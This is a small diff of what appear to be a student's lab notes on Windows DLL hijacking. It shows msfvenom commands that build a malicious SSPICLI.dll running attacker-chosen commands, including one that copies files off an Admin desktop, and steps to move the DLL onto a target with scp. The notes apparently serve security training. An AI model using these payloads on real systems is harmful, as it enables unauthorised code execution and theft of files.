@@ -507,4 +507,5 @@ auditpol /get /category:* | findstr /i "Success Failure"
 - identify .dll to alter
 - msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > c:\Users\student\Desktop\whoami.txt' -f dll > SSPICLI.dll (SSPICLI.dll is what we are naming it)
 - once created SCP to your target box
-- scp from windows and pull from linbox. scp student@<linops ip>:/home/student/SSPICLI.dll C:\Users\student\Documents\putty
+- scp from windows and pull from linbox. scp student@<jump ip>:/home/student/<dllname> C:\
+- msfvenom -p windows/exec CMD='xcopy C:\Users\Admin\Desktop\* C:\Users\comrade.WIN2-INTERNAL-D\Desktop' -f dll > SSPICLI.dll
